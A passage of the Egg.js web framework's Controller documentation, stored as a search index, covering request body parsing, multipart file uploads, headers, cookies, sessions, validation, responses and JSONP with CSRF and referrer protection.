    assert.equal(this.ctx.request.body.title, 'controller');
    assert.equal(this.ctx.request.body.content, 'what is controller');
  }
}
`,paraId:63,tocIndex:10},{value:"The framework configures some default parameters for bodyParser and has the following features:",paraId:64,tocIndex:10},{value:"when Content-Type is ",paraId:65,tocIndex:10},{value:"application/json",paraId:65,tocIndex:10},{value:", ",paraId:65,tocIndex:10},{value:"application/json-patch+json",paraId:65,tocIndex:10},{value:", ",paraId:65,tocIndex:10},{value:"application/vnd.api+json",paraId:65,tocIndex:10},{value:" and ",paraId:65,tocIndex:10},{value:"application/csp-report",paraId:65,tocIndex:10},{value:", it parses the request body as JSON format and limits the maximum length of the body down to ",paraId:65,tocIndex:10},{value:"100kb",paraId:65,tocIndex:10},{value:".",paraId:65,tocIndex:10},{value:"when Content-Type is ",paraId:65,tocIndex:10},{value:"application/x-www-form-urlencoded",paraId:65,tocIndex:10},{value:", it parses the request body as Form format and limits the maximum length of the body down to ",paraId:65,tocIndex:10},{value:"100kb",paraId:65,tocIndex:10},{value:".",paraId:65,tocIndex:10},{value:"when parses successfully, the body must be an Object(also can be an array).",paraId:65,tocIndex:10},{value:"The mostly adjusted config field is the maximum length of the request body for parsing which can be configured in ",paraId:66,tocIndex:10},{value:"config/config.default.js",paraId:66,tocIndex:10},{value:" to overwrite the default value of the framework:",paraId:66,tocIndex:10},{value:`module.exports = {
  bodyParser: {
    jsonLimit: '1mb',
    formLimit: '1mb',
  },
};
`,paraId:67,tocIndex:10},{value:"If user request exceeds the maximum length for parsing that we configured, the framework will throw an exception whose status code is ",paraId:68,tocIndex:10},{value:"413",paraId:68,tocIndex:10},{value:"; if request body fails to be parsed(e.g. wrong JSON), an exception with status code ",paraId:68,tocIndex:10},{value:"400",paraId:68,tocIndex:10},{value:" will be thrown.",paraId:68,tocIndex:10},{value:"Note: when adjusting the maximum length of the body for bodyParser, if we have a reverse proxy(Nginx) in front of our application, we may need to adjust its configuration, so that the reverse proxy also supports the same length of request body.",paraId:69,tocIndex:10},{value:"A common mistake is to confuse ",paraId:70,tocIndex:10},{value:"ctx.request.body",paraId:70,tocIndex:10},{value:" and ",paraId:70,tocIndex:10},{value:"ctx.body",paraId:70,tocIndex:10},{value:"(which is alias for ",paraId:70,tocIndex:10},{value:"ctx.response.body",paraId:70,tocIndex:10},{value:").",paraId:70,tocIndex:10},{value:"The ",paraId:71,tocIndex:11},{value:"body",paraId:71,tocIndex:11},{value:" in the request can carry parameters as well as files. Generally speaking, our browsers always send files in ",paraId:71,tocIndex:11},{value:"multipart/form-data",paraId:71,tocIndex:11},{value:", and we now have two kinds of ways supporting submitting and acquiring files with the help of the framework's plugin ",paraId:71,tocIndex:11},{value:"Multipart",paraId:71,tocIndex:11},{value:".",paraId:71,tocIndex:11},{value:"File",paraId:72,tocIndex:11},{value:`
If you have no ideas about Nodejs's Stream at all, the `,paraId:72,tocIndex:11},{value:"File",paraId:72,tocIndex:12},{value:" mode suits you well:",paraId:72,tocIndex:11},{value:"In your config file, enable ",paraId:73,tocIndex:11},{value:"file",paraId:73,tocIndex:11},{value:" mode first:",paraId:73,tocIndex:11},{value:`// config/config.default.js
exports.multipart = {
  mode: 'file',
};
`,paraId:74,tocIndex:11},{value:"Submitting / Acquiring Files:",paraId:75,tocIndex:11},{value:"For Single File:",paraId:76,tocIndex:11},{value:"Your HTML static front-end codes should look like this below:",paraId:77,tocIndex:11},{value:`<form
  method="POST"
  action="/upload?_csrf={{ ctx.csrf | safe }}"
  enctype="multipart/form-data"
>
  title: <input name="title" /> file: <input name="file" type="file" />
  <button type="submit">Upload</button>
</form>
`,paraId:78,tocIndex:11},{value:"The corresponding backend codes are:",paraId:79,tocIndex:11},{value:`// app/controller/upload.js
const Controller = require('egg').Controller;
const fs = require('fs/promises');

module.exports = class extends Controller {
  async upload() {
    const { ctx } = this;
    const file = ctx.request.files[0];
    const name = 'egg-multipart-test/' + path.basename(file.filename);
    let result;
    try {
      // process file (e.g: upload to cloud storage)
      result = await ctx.oss.put(name, file.filepath);
    } finally {
      // need to remove the tmp file
      await fs.unlink(file.filepath);
    }

    ctx.body = {
      url: result.url,
      // get all field values
      requestBody: ctx.request.body,
    };
  }
};
`,paraId:80,tocIndex:11},{value:"For Multiple Files:",paraId:81,tocIndex:11},{value:"For multiple files, with the help of ",paraId:82,tocIndex:11},{value:"ctx.request.files",paraId:82,tocIndex:11},{value:", we can loop each of them and do what process we like:",paraId:82,tocIndex:11},{value:"Your HTML static front-end codes should look like this below:",paraId:83,tocIndex:11},{value:`<form
  method="POST"
  action="/upload?_csrf={{ ctx.csrf | safe }}"
  enctype="multipart/form-data"
>
  title: <input name="title" /> file1: <input name="file1" type="file" /> file2:
  <input name="file2" type="file" />
  <button type="submit">Upload</button>
</form>
`,paraId:84,tocIndex:11},{value:"The corresponding backend codes are:",paraId:85,tocIndex:11},{value:`// app/controller/upload.js
const Controller = require('egg').Controller;
const fs = require('fs/promises');

module.exports = class extends Controller {
  async upload() {
    const { ctx } = this;
    console.log(ctx.request.body);
    console.log('got %d files', ctx.request.files.length);
    for (const file of ctx.request.files) {
      console.log('field: ' + file.fieldname);
      console.log('filename: ' + file.filename);
      console.log('encoding: ' + file.encoding);
      console.log('mime: ' + file.mime);
      console.log('tmp filepath: ' + file.filepath);
      let result;
      try {
        // process file (e.g: upload to cloud storage)
        result = await ctx.oss.put(
          'egg-multipart-test/' + file.filename,
          file.filepath,
        );
      } finally {
        // need to remove the tmp file
        await fs.unlink(file.filepath);
      }
      console.log(result);
    }
  }
};
`,paraId:86,tocIndex:11},{value:"Stream",paraId:87,tocIndex:11},{value:`
If you are very familiar with `,paraId:87,tocIndex:11},{value:"Stream",paraId:87,tocIndex:13},{value:" in Nodejs, you can choose this way. In a controller, we can fetch the uploaded files through ",paraId:87,tocIndex:11},{value:"ctx.getFileStream()",paraId:87,tocIndex:13},{value:".",paraId:87,tocIndex:11},{value:"For Single File\uFF1A",paraId:88,tocIndex:11},{value:`<form
  method="POST"
  action="/upload?_csrf={{ ctx.csrf | safe }}"
  enctype="multipart/form-data"
>
  title: <input name="title" /> file: <input name="file" type="file" />
  <button type="submit">Upload</button>
</form>
`,paraId:89,tocIndex:11},{value:`const path = require('path');
const sendToWormhole = require('stream-wormhole');
const Controller = require('egg').Controller;

class UploaderController extends Controller {
  async upload() {
    const ctx = this.ctx;
    const stream = await ctx.getFileStream();
    const name = 'egg-multipart-test/' + path.basename(stream.filename);
    let result;
    try {
      // process file (e.g: upload to cloud storage)
      result = await ctx.oss.put(name, stream);
    } catch (err) {
      // You MUST consume the file stream, otherwises the browser cannot response any more
      await sendToWormhole(stream);
      throw err;
    }

    ctx.body = {
      url: result.url,
      // All the fields in the form can be fetched through \`stream.fields\`
      fields: stream.fields,
    };
  }
}

module.exports = UploaderController;
`,paraId:90,tocIndex:11},{value:"To acquire the uploaded files easily, there're two conditions at least:",paraId:91,tocIndex:11},{value:"Only ONE file per time.",paraId:92,tocIndex:11},{value:"The field of uploading file MUST be after the other fields in a form, otherwise you cannot get other fields after getting the file stream.",paraId:92,tocIndex:11},{value:"For Multiple Files:",paraId:93,tocIndex:11},{value:"For multiple files, you should do the following instead of using ",paraId:94,tocIndex:11},{value:"ctx.getFileStream()",paraId:94,tocIndex:11},{value:":",paraId:94,tocIndex:11},{value:`const sendToWormhole = require('stream-wormhole');
const Controller = require('egg').Controller;

class UploaderController extends Controller {
  async upload() {
    const ctx = this.ctx;
    const parts = ctx.multipart();
    let part;
    // parts() return a promise
    while ((part = await parts()) != null) {
      if (part.length) {
        // arrays are busboy fields
        console.log('field: ' + part[0]);
        console.log('value: ' + part[1]);
        console.log('valueTruncated: ' + part[2]);
        console.log('fieldnameTruncated: ' + part[3]);
      } else {
        if (!part.filename) {
          // When a user clicks \`upload\` before choosing a file,
          // \`part\` will be file stream, but \`part.filename\` is empty.
          // We must handler this by notifying the user that he/she should
          // choose a file before submitting
          return;
        }
        // otherwise, it's a fully-filled stream
        console.log('field: ' + part.fieldname);
        console.log('filename: ' + part.filename);
        console.log('encoding: ' + part.encoding);
        console.log('mime: ' + part.mime);
        let result;
        try {
          // process file (e.g: upload to cloud storage)
          result = await ctx.oss.put(
            'egg-multipart-test/' + part.filename,
            part,
          );
        } catch (err) {
          // You MUST consume the file stream, otherwises the browser cannot response any more
          await sendToWormhole(part);
          throw err;
        }
        console.log(result);
      }
    }
    console.log('and we are done parsing the form!');
  }
}

module.exports = UploaderController;
`,paraId:95,tocIndex:11},{value:"The framework also has the limits for the safety of uploading files, the default white list is:",paraId:96,tocIndex:11},{value:`// images
'.jpg', '.jpeg', // image/jpeg
'.png', // image/png, image/x-png
'.gif', // image/gif
'.bmp', // image/bmp
'.wbmp', // image/vnd.wap.wbmp
'.webp',
'.tif',
'.psd',
// text
'.svg',
'.js', '.jsx',
'.json',
'.css', '.less',
'.html', '.htm',
'.xml',
// tar
'.zip',
'.gz', '.tgz', '.gzip',
// video
'.mp3',
'.mp4',
'.avi',
`,paraId:97,tocIndex:11},{value:"Users can add new file extensions in ",paraId:98,tocIndex:11},{value:"config/config.default.js",paraId:98,tocIndex:11},{value:", or rewrite a whole white list:",paraId:98,tocIndex:11},{value:"Newly-added a file extension:",paraId:99,tocIndex:11},{value:`module.exports = {
  multipart: {
    fileExtensions: ['.apk'], // Add support for apk files
  },
};
`,paraId:100,tocIndex:11},{value:"Overwriting a whole white list:",paraId:101,tocIndex:11},{value:`module.exports = {
  multipart: {
    whitelist: ['.png'], // ONLY files of png is allowed
  },
};
`,paraId:102,tocIndex:11},{value:"Notice\uFF1A",paraId:103,tocIndex:11},{value:"fileExtensions",paraId:103,tocIndex:11},{value:" will be IGNORED when ",paraId:103,tocIndex:11},{value:"whitelist",paraId:103,tocIndex:11},{value:" is overwritten.",paraId:103,tocIndex:11},{value:"For more tech details about this, please refer ",paraId:104,tocIndex:11},{value:"Egg-Multipart",paraId:104,tocIndex:11},{value:".",paraId:104,tocIndex:11},{value:"header",paraId:46},{value:"Apart from URL and request body, some parameters can be sent by request header. The framework provides some helper attributes and methods to retrieve them.",paraId:105,tocIndex:14},{value:"ctx.headers",paraId:106,tocIndex:14},{value:", ",paraId:106,tocIndex:14},{value:"ctx.header",paraId:106,tocIndex:14},{value:", ",paraId:106,tocIndex:14},{value:"ctx.request.headers",paraId:106,tocIndex:14},{value:", ",paraId:106,tocIndex:14},{value:"ctx.request.header",paraId:106,tocIndex:14},{value:": these methods are equivalent and all of them get the whole header object.",paraId:106,tocIndex:14},{value:"ctx.get(name)",paraId:106,tocIndex:14},{value:", ",paraId:106,tocIndex:14},{value:"ctx.request.get(name)",paraId:106,tocIndex:14},{value:": get the value of one parameter from the request header, if the parameter does not exist, an empty string will be returned.",paraId:106,tocIndex:14},{value:"We recommend you use ",paraId:106,tocIndex:14},{value:"ctx.get(name)",paraId:106,tocIndex:14},{value:" rather than ",paraId:106,tocIndex:14},{value:"ctx.headers['name']",paraId:106,tocIndex:14},{value:" because the former handles upper/lower case automatically.",paraId:106,tocIndex:14},{value:"Since header is special, some of which are given specific meanings by the ",paraId:107,tocIndex:14},{value:"HTTP",paraId:107,tocIndex:14},{value:" protocol (like ",paraId:107,tocIndex:14},{value:"Content-Type",paraId:107,tocIndex:14},{value:", ",paraId:107,tocIndex:14},{value:"Accept",paraId:107,tocIndex:14},{value:"), some are set by the reverse proxy as a convention (X-Forwarded-For), and the framework provides some convenient getters for them as well, for more details please refer to ",paraId:107,tocIndex:14},{value:"API",paraId:107,tocIndex:14},{value:".",paraId:107,tocIndex:14},{value:"Specially when we set ",paraId:108,tocIndex:14},{value:"config.proxy = true",paraId:108,tocIndex:14},{value:" to deploy the application behind the reverse proxy (Nginx), some Getters' internal process may be changed.",paraId:108,tocIndex:14},{value:"ctx.host",paraId:46},{value:"Reads the header's value configured by ",paraId:109,tocIndex:15},{value:"config.hostHeaders",paraId:109,tocIndex:15},{value:" firstly, if fails, then it tries to get the value of host header, if fails again, it returns an empty string.",paraId:109,tocIndex:15},{value:"config.hostHeaders",paraId:110,tocIndex:15},{value:" defaults to ",paraId:110,tocIndex:15},{value:"x-forwarded-host",paraId:110,tocIndex:15},{value:".",paraId:110,tocIndex:15},{value:"ctx.protocol",paraId:46},{value:"When you get protocol through this Getter, it checks whether current connection is an encrypted one or not, if it is, it returns HTTPS.",paraId:111,tocIndex:16},{value:"When current connection is not an encrypted one, it reads the header's value configured by ",paraId:112,tocIndex:16},{value:"config.protocolHeaders",paraId:112,tocIndex:16},{value:" to check HTTP or HTTPS, if it fails, we can set a safe-value(defaults to HTTP) through ",paraId:112,tocIndex:16},{value:"config.protocol",paraId:112,tocIndex:16},{value:" in the configuration.",paraId:112,tocIndex:16},{value:"config.protocolHeaders",paraId:113,tocIndex:16},{value:" defaults to ",paraId:113,tocIndex:16},{value:"x-forwarded-proto",paraId:113,tocIndex:16},{value:".",paraId:113,tocIndex:16},{value:"ctx.ips",paraId:46},{value:"A IP address list of all intermediate equipments that a request go through can be get by ",paraId:114,tocIndex:17},{value:"ctx.ips",paraId:114,tocIndex:17},{value:", only when ",paraId:114,tocIndex:17},{value:"config.proxy = true",paraId:114,tocIndex:17},{value:", it reads the header's value configured by ",paraId:114,tocIndex:17},{value:"config.ipHeaders",paraId:114,tocIndex:17},{value:" instead, if fails, it returns an empty array.",paraId:114,tocIndex:17},{value:"config.ipHeaders",paraId:115,tocIndex:17},{value:" defaults to ",paraId:115,tocIndex:17},{value:"x-forwarded-for",paraId:115,tocIndex:17},{value:".",paraId:115,tocIndex:17},{value:"ctx.ip",paraId:46},{value:"The IP address of the sender of the request can be get by ",paraId:116,tocIndex:18},{value:"ctx.ip",paraId:116,tocIndex:18},{value:", it reads from ",paraId:116,tocIndex:18},{value:"ctx.ips",paraId:116,tocIndex:18},{value:" firstly, if ",paraId:116,tocIndex:18},{value:"ctx.ips",paraId:116,tocIndex:18},{value:" is empty, it returns the connection sender's IP address.",paraId:116,tocIndex:18},{value:"Note: ",paraId:117,tocIndex:18},{value:"ip",paraId:117,tocIndex:18},{value:" and ",paraId:117,tocIndex:18},{value:"ips",paraId:117,tocIndex:18},{value:" are different, if ",paraId:117,tocIndex:18},{value:"config.proxy = false",paraId:117,tocIndex:18},{value:", ",paraId:117,tocIndex:18},{value:"ip",paraId:117,tocIndex:18},{value:" returns the connection sender's IP address while ",paraId:117,tocIndex:18},{value:"ips",paraId:117,tocIndex:18},{value:" returns an empty array.",paraId:117,tocIndex:18},{value:"All HTTP requests are stateless but, on the contrary, our Web applications usually need to know who sends the requests. To make it through, the HTTP protocol designs a special request header: ",paraId:118,tocIndex:19},{value:"Cookie",paraId:118,tocIndex:19},{value:". With the response header (set-cookie), the server is able to send a few data to the client, the browser saves these data according to the protocol and brings them along with the next request(according to the protocol and for safety reasons, only when accessing websites that match the rules specified by Cookie does the browser bring related Cookies).",paraId:118,tocIndex:19},{value:"Through ",paraId:119,tocIndex:19},{value:"ctx.cookies",paraId:119,tocIndex:19},{value:", we can conveniently and safely set and get Cookie in Controller.",paraId:119,tocIndex:19},{value:`class CookieController extends Controller {
  async add() {
    const ctx = this.ctx;
    let count = ctx.cookies.get('count');
    count = count ? Number(count) : 0;
    ctx.cookies.set('count', ++count);
    ctx.body = count;
  }

  async remove() {
    const ctx = this.ctx;
    const count = ctx.cookies.set('count', null);
    ctx.status = 204;
  }
}
`,paraId:120,tocIndex:19},{value:"Although Cookie is only a header in HTTP, multiple key-value pairs can be set in the format of ",paraId:121,tocIndex:19},{value:"foo=bar;foo1=bar1;",paraId:121,tocIndex:19},{value:".",paraId:121,tocIndex:19},{value:"In Web applications, Cookie is usually used to send the identity information of the client, so it has many safety related configurations which can not be ignored, ",paraId:122,tocIndex:19},{value:"Cookie",paraId:123,tocIndex:19},{value:" explains the usage and safety related configurations of Cookie in detail and is worth being read in depth.",paraId:122,tocIndex:19},{value:"There are mainly these attributes below can be used to configure default Cookie options in ",paraId:124,tocIndex:20},{value:"config.default.js",paraId:124,tocIndex:20},{value:":",paraId:124,tocIndex:20},{value:`module.exports = {
  cookies: {
    // httpOnly: true | false,
    // sameSite: 'none|lax|strict',
  },
};
`,paraId:125,tocIndex:20},{value:"e.g.: Configured application level Cookie ",paraId:126,tocIndex:20},{value:"SameSite",paraId:126,tocIndex:20},{value:" property to ",paraId:126,tocIndex:20},{value:"Lax",paraId:126,tocIndex:20},{value:".",paraId:126,tocIndex:20},{value:`module.exports = {
  cookies: {
    sameSite: 'lax',
  },
};
`,paraId:127,tocIndex:20},{value:"By using Cookie, we can create an individual Session specific to every user to store user identity information, which will be encrypted then stored in Cookie to perform session persistence across requests.",paraId:128,tocIndex:21},{value:"The framework builds in ",paraId:129,tocIndex:21},{value:"Session",paraId:129,tocIndex:21},{value:" plugin, which provides ",paraId:129,tocIndex:21},{value:"ctx.session",paraId:129,tocIndex:21},{value:" for us to get or set current user's Session.",paraId:129,tocIndex:21},{value:`class PostController extends Controller {
  async fetchPosts() {
    const ctx = this.ctx;
    // get data from Session
    const userId = ctx.session.userId;
    const posts = await ctx.service.post.fetch(userId);
    // set value to Session
    ctx.session.visited = ctx.session.visited ? ++ctx.session.visited : 1;
    ctx.body = {
      success: true,
      posts,
    };
  }
}
`,paraId:130,tocIndex:21},{value:"It's quite intuitional to use Session, just get or set directly, if you want to delete it, you can assign it to ",paraId:131,tocIndex:21},{value:"null",paraId:131,tocIndex:21},{value:":",paraId:131,tocIndex:21},{value:`class SessionController extends Controller {
  async deleteSession() {
    this.ctx.session = null;
  }
}
`,paraId:132,tocIndex:21},{value:"Like Cookie, Session has many safety related configurations and functions etc., so it's better to read ",paraId:133,tocIndex:21},{value:"Session",paraId:134,tocIndex:21},{value:" in depth in ahead.",paraId:133,tocIndex:21},{value:"There are mainly these attributes below can be used to configure Session in ",paraId:135,tocIndex:22},{value:"config.default.js",paraId:135,tocIndex:22},{value:":",paraId:135,tocIndex:22},{value:`module.exports = {
  key: 'EGG_SESS', // the name of key-value pairs, which is specially used by Cookie to store Session
  maxAge: 86400000, // Session maximum valid time
};
`,paraId:136,tocIndex:22},{value:"After getting parameters from user requests, in most cases, it is inevitable to validate these parameters.",paraId:137,tocIndex:23},{value:"With the help of the convenient parameter validation mechanism provided by ",paraId:138,tocIndex:23},{value:"Validate",paraId:138,tocIndex:23},{value:" plugin, with which we can do all kinds of complex parameter validations.",paraId:138,tocIndex:23},{value:`// config/plugin.js
exports.validate = {
  enable: true,
  package: 'egg-validate',
};
`,paraId:139,tocIndex:23},{value:"Validate parameters directly through ",paraId:140,tocIndex:23},{value:"ctx.validate(rule, [body])",paraId:140,tocIndex:23},{value:":",paraId:140,tocIndex:23},{value:`class PostController extends Controller {
  async create() {
    // validate parameters
    // if the second parameter is absent, \`ctx.request.body\` is validated automatically
    this.ctx.validate({
      title: { type: 'string' },
      content: { type: 'string' },
    });
  }
}
`,paraId:141,tocIndex:23},{value:"When the validation fails, an exception will be thrown immediately with an error code of 422 and an errors field containing the detailed information why it fails. You can capture this exception through ",paraId:142,tocIndex:23},{value:"try catch",paraId:142,tocIndex:23},{value:" and handle it all by yourself.",paraId:142,tocIndex:23},{value:`class PostController extends Controller {
  async create() {
    const ctx = this.ctx;
    try {
      ctx.validate(createRule);
    } catch (err) {
      ctx.logger.warn(err.errors);
      ctx.body = { success: false };
      return;
    }
  }
}
`,paraId:143,tocIndex:23},{value:"The parameter validation is done by ",paraId:144,tocIndex:24},{value:"Parameter",paraId:144,tocIndex:24},{value:", and all supported validation rules can be found in its document.",paraId:144,tocIndex:24},{value:"In addition to built-in validation types introduced in the previous section, sometimes we hope to customize several validation rules to make the development more convenient and now customized rules can be added through ",paraId:145,tocIndex:25},{value:"app.validator.addRule(type, check)",paraId:145,tocIndex:25},{value:".",paraId:145,tocIndex:25},{value:`// app.js
app.validator.addRule('json', (rule, value) => {
  try {
    JSON.parse(value);
  } catch (err) {
    return 'must be json string';
  }
});
`,paraId:146,tocIndex:25},{value:"After adding the customized rule, it can be used immediately in Controller to do parameter validation.",paraId:147,tocIndex:25},{value:`class PostController extends Controller {
  async handler() {
    const ctx = this.ctx;
    // query.test field must be a json string
    const rule = { test: 'json' };
    ctx.validate(rule, ctx.query);
  }
}
`,paraId:148,tocIndex:25},{value:"We do not prefer to implement too many business logics in Controller, so a ",paraId:149,tocIndex:26},{value:"Service",paraId:150,tocIndex:26},{value:" layer is provided to encapsulate business logics, which not only increases the reusability of codes but also makes it easy for us to test our business logics.",paraId:149,tocIndex:26},{value:"In Controller, any method of any Service can be called and, in the meanwhile, Service is lazy loaded which means it is only initialized by the framework on the first time it is accessed.",paraId:151,tocIndex:26},{value:`class PostController extends Controller {
  async create() {
    const ctx = this.ctx;
    const author = ctx.session.userId;
    const req = Object.assign(ctx.request.body, { author });
    // using service to handle business logics
    const res = await ctx.service.post.create(req);
    ctx.body = { id: res.id };
    ctx.status = 201;
  }
}
`,paraId:152,tocIndex:26},{value:"To write a Service in detail, please refer to ",paraId:153,tocIndex:26},{value:"Service",paraId:154,tocIndex:26},{value:".",paraId:153,tocIndex:26},{value:"After business logics are handled, the last thing Controller should do is to send the processing result to users with an HTTP response.",paraId:155,tocIndex:27},{value:"HTTP designs many ",paraId:156,tocIndex:28},{value:"Status Code",paraId:156,tocIndex:28},{value:", each of which indicates a specific meaning, and setting the status code correctly makes the response more semantic.",paraId:156,tocIndex:28},{value:"The framework provides a convenient Setter to set the status code:",paraId:157,tocIndex:28},{value:`class PostController extends Controller {
  async create() {
    // set status code to 201
    this.ctx.status = 201;
  }
}
`,paraId:158,tocIndex:28},{value:"As to which status code should be used for a specific case, please refer to status code meanings on ",paraId:159,tocIndex:28},{value:"List of HTTP status codes",paraId:159,tocIndex:28},{value:"Most data is sent to requesters through the body and, just like the body in the request, the body sent by the response demands a set of corresponding Content-Type to inform clients how to parse data.",paraId:160,tocIndex:29},{value:"for a RESTful API controller, we usually send a body whose Content-Type is ",paraId:161,tocIndex:29},{value:"application/json",paraId:161,tocIndex:29},{value:", indicating it's a JSON string.",paraId:161,tocIndex:29},{value:"for a HTML page controller, we usually send a body whose Content-Type is ",paraId:161,tocIndex:29},{value:"text/html",paraId:161,tocIndex:29},{value:", indicating it's a piece of HTML code.",paraId:161,tocIndex:29},{value:"Note: ",paraId:162,tocIndex:29},{value:"ctx.body",paraId:162,tocIndex:29},{value:" is alias of ",paraId:162,tocIndex:29},{value:"ctx.response.body",paraId:162,tocIndex:29},{value:", don't confuse with ",paraId:162,tocIndex:29},{value:"ctx.request.body",paraId:162,tocIndex:29},{value:".",paraId:162,tocIndex:29},{value:`class ViewController extends Controller {
  async show() {
    this.ctx.body = {
      name: 'egg',
      category: 'framework',
      language: 'Node.js',
    };
  }

  async page() {
    this.ctx.body = '<html><h1>Hello</h1></html>';
  }
}
`,paraId:163,tocIndex:29},{value:"Due to the Stream feature of Node.js, we need to return the response by Stream in some cases, e.g., returning a big file, the proxy server returns content from upstream straightforward, the framework also supports setting the body into a Stream directly and handling error events on this stream well in the meanwhile.",paraId:164,tocIndex:29},{value:`class ProxyController extends Controller {
  async proxy() {
    const ctx = this.ctx;
    const result = await ctx.curl(url, {
      streaming: true,
    });
    ctx.set(result.header);
    // result.res is stream
    ctx.body = result.res;
  }
}
`,paraId:165,tocIndex:29},{value:`Usually we do not write HTML pages by hand, instead we generate them by a template engine.
Egg itself does not integrate any template engine, but it establishes the `,paraId:166,tocIndex:30},{value:"View Plugin Specification",paraId:167,tocIndex:30},{value:". Once the template engine is loaded, ",paraId:166,tocIndex:30},{value:"ctx.render(template)",paraId:166,tocIndex:30},{value:" can be used to render templates to HTML directly.",paraId:166,tocIndex:30},{value:`class HomeController extends Controller {
  async index() {
    const ctx = this.ctx;
    await ctx.render('home.tpl', { name: 'egg' });
    // ctx.body = await ctx.renderString('hi, {{ name }}', { name: 'egg' });
  }
}
`,paraId:168,tocIndex:30},{value:"For detailed examples, please refer to ",paraId:169,tocIndex:30},{value:"Template Rendering",paraId:170,tocIndex:30},{value:".",paraId:169,tocIndex:30},{value:"Sometimes we need to provide API services for pages in a different domain, and, for historical reasons, ",paraId:171,tocIndex:31},{value:"CORS",paraId:171,tocIndex:31},{value:" fails to make it through, while ",paraId:171,tocIndex:31},{value:"JSONP",paraId:171,tocIndex:31},{value:" does.",paraId:171,tocIndex:31},{value:"Since misuse of JSONP leads to dozens of security issues, the framework supplies a convenient way to respond JSONP data, encapsulating ",paraId:172,tocIndex:31},{value:"JSONP XSS Related Security Precautions",paraId:173,tocIndex:31},{value:", and supporting the validation of CSRF and referrer.",paraId:172,tocIndex:31},{value:"app.jsonp()",paraId:174,tocIndex:31},{value:" provides a middleware for the controller to respond JSONP data. We may add this middleware to the router that needs to support jsonp:",paraId:174,tocIndex:31},{value:`// app/router.js
module.exports = (app) => {
  const jsonp = app.jsonp();
  app.router.get('/api/posts/:id', jsonp, app.controller.posts.show);
  app.router.get('/api/posts', jsonp, app.controller.posts.list);
};
`,paraId:175,tocIndex:31},{value:"We just program as usual in the Controller:",paraId:176,tocIndex:31},{value:`// app/controller/posts.js
class PostController extends Controller {
  async show() {
    this.ctx.body = {
      name: 'egg',
      category: 'framework',
      language: 'Node.js',
    };
  }
}
`,paraId:177,tocIndex:31},{value:"When user's requests access this controller through a corresponding URL, if the query contains the ",paraId:178,tocIndex:31},{value:"_callback=fn",paraId:178,tocIndex:31},{value:" parameter, data is returned in JSONP format, otherwise in JSON format.",paraId:178,tocIndex:31},{value:"By default, the framework determines whether to return data in JSONP format or not depending on the ",paraId:179,tocIndex:32},{value:"_callback",paraId:179,tocIndex:32},{value:" parameter in the query, and the method name set by ",paraId:179,tocIndex:32},{value:"_callback",paraId:179,tocIndex:32},{value:" must be less than 50 characters. Applications may overwrite the default configuration globally in ",paraId:179,tocIndex:32},{value:"config/config.default.js",paraId:179,tocIndex:32},{value:":",paraId:179,tocIndex:32},{value:`// config/config.default.js
exports.jsonp = {
  callback: 'callback', // inspecting the \`callback\` parameter in the query
  limit: 100, // the maximum size of the method name is 100 characters
};
`,paraId:180,tocIndex:32},{value:"With the configuration above, if a user requests ",paraId:181,tocIndex:32},{value:"/api/posts/1?callback=fn",paraId:181,tocIndex:32},{value:", a JSONP format response is sent, if ",paraId:181,tocIndex:32},{value:"/api/posts/1",paraId:181,tocIndex:32},{value:", a JSON format response is sent.",paraId:181,tocIndex:32},{value:"Also we can overwrite the default configuration in ",paraId:182,tocIndex:32},{value:"app.jsonp()",paraId:182,tocIndex:32},{value:" when creating the middleware and therefore separate configurations is used for separate routers:",paraId:182,tocIndex:32},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller, jsonp } = app;
  router.get(
    '/api/posts/:id',
    jsonp({ callback: 'callback' }),
    controller.posts.show,
  );
  router.get('/api/posts', jsonp({ callback: 'cb' }), controller.posts.list);
};
`,paraId:183,tocIndex:32},{value:"By default, XSS is not defended when responding JSONP, and, in some cases, it is quite dangerous. We classify JSONP APIs into three type grossly:",paraId:184,tocIndex:33},{value:"querying non-sensitive data, e.g. getting the public post list of a BBS.",paraId:185,tocIndex:33},{value:"querying sensitive data, e.g. getting the transaction record of a user.",paraId:185,tocIndex:33},{value:"submitting data and modifying the database, e.g. create a new order for a user.",paraId:185,tocIndex:33},{value:"If our JSONP API provides the last two type services and, without any XSS defense, user's sensitive data may be leaked and even user may be phished. Given this, the framework supports the validations of CSRF and referrer by default.",paraId:186,tocIndex:33},{value:"In the JSONP configuration, we could enable the CSRF validation for JSONP APIs simply by setting ",paraId:187,tocIndex:34},{value:"csrf: true",paraId:187,tocIndex:34},{value:".",paraId:187,tocIndex:34},{value:`// config/config.default.js
module.exports = {
  jsonp: {
    csrf: true,
  },
};
`,paraId:188,tocIndex:34},{value:"Note: the CSRF validation depends on the Cookie based CSRF validation provided by ",paraId:189,tocIndex:34},{value:"security",paraId:190,tocIndex:34},{value:".",paraId:189,tocIndex:34},{value:"When the CSRF validation is enabled, the client should bring CSRF token as well when it sends a JSONP request, if the page where the JSONP sender belongs to shares the same domain with our services, CSRF token in Cookie can be read(CSRF can be set manually if it is absent), and is brought together with the request.",paraId:191,tocIndex:34},{value:"The CSRF way can be used for JSONP request validation only if the main domains are the same, while providing JSONP services for pages in different domains, we can limit JSONP senders into a controllable rang by configuring the referrer whitelist.",paraId:192,tocIndex:35},{value:`//config/config.default.js
exports.jsonp = {
  whiteList: /^https?:\\/\\/test.com\\//,
  // whiteList: '.test.com',
  // whiteList: 'sub.test.com',
  // whiteList: [ 'sub.test.com', 'sub2.test.com' ],
};
`,paraId:193,tocIndex:35},{value:"whileList",paraId:194,tocIndex:35},{value:" can be configured as regular expression, string and array:",paraId:194,tocIndex:35},{value:"Regular Expression: only requests whose Referrer match the regular expression are allowed to access the JSONP API. When composing the regular expression, please also notice the leading ",paraId:195,tocIndex:35},{value:"^",paraId:195,tocIndex:35},{value:" and tail ",paraId:195,tocIndex:35},{value:"\\/",paraId:195,tocIndex:35},{value:" which guarantees the whole domain matches.",paraId:195,tocIndex:35},{value:`exports.jsonp = {
  whiteList: /^https?:\\/\\/test.com\\//,
};
// matches referrer:
// https://test.com/hello
// http://test.com/
